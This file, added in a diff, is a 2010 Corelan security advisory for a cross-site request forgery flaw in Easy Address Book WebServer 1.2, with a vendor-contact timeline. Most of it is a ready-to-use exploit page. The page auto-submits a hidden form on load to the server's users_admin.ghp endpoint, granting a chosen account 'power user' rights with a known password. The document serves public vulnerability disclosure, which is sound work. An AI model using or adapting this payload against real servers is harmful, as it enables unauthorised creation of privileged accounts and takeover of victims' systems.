@@ -1,0 +1,52 @@
+        |------------------------------------------------------------------|
+        |                         __               __                      |
+        |   _________  ________  / /___ _____     / /____  ____ _____ ___  |
+        |  / ___/ __ \/ ___/ _ \/ / __ `/ __ \   / __/ _ \/ __ `/ __ `__ \ |
+        | / /__/ /_/ / /  /  __/ / /_/ / / / /  / /_/  __/ /_/ / / / / / / |
+        | \___/\____/_/   \___/_/\__,_/_/ /_/   \__/\___/\__,_/_/ /_/ /_/  |
+        |                                                                  |
+        |                                       http://www.corelan.be:8800 |
+        |                                              security@corelan.be |
+        |                                                                  |
+        |-------------------------------------------------[ EIP Hunters ]--|
+
+# Advisory      : http://www.corelan.be:8800/advisories.php?id=CORELAN-10-043
+# Software      : Easy Address Book WebServer 1.2
+# Author        : Markot
+# Date          : May 25, 2010
+# OS            : Windows
+# Tested on     : XP SP3 En (Virtual box)
+# Type of vuln  : CSRF
+# Greetz to     : Corelan Security Team
+# http://www.corelan.be:8800/index.php/security/corelan-team-members/
+# Script provided 'as is', without any warranty.
+# Use for educational purposes only.
+# Do not use this code to do anything illegal !
+#
+# Note : you are not allowed to edit/modify this code.
+# If you do, Corelan cannot be held responsible for any damages this may cause.
+
+#code
+
+ <html>
+ <body>
+ <body onload="document.forms['Login'].submit();">
+ <form method="POST" name="Login" action="http://192.168.1.200:80/users_admin.ghp">
+ <input type="hidden" name="userid" value="3"/>
+ <input type="hidden" name="username" value="corelanteam"/>
+ <input type="hidden" name="password" value="corelanteam"/>
+ <input type="hidden" name="email" value="markot@corelan.be"/>
+ <input type="hidden" name="level" value="power user"/>
+ <input type="hidden" name="state" value="Enable"/>
+ <input type="hidden" name="add_user" value="Update"/>
+ </form>
+ </body>
+ </html>
+
+Author/Vendor communication
+
+ May 1 2010 : vendor contacted
+
+ May 17 2010: reminder sent, no feedback from the vendor
+
+ May 25 2010: Public disclosure
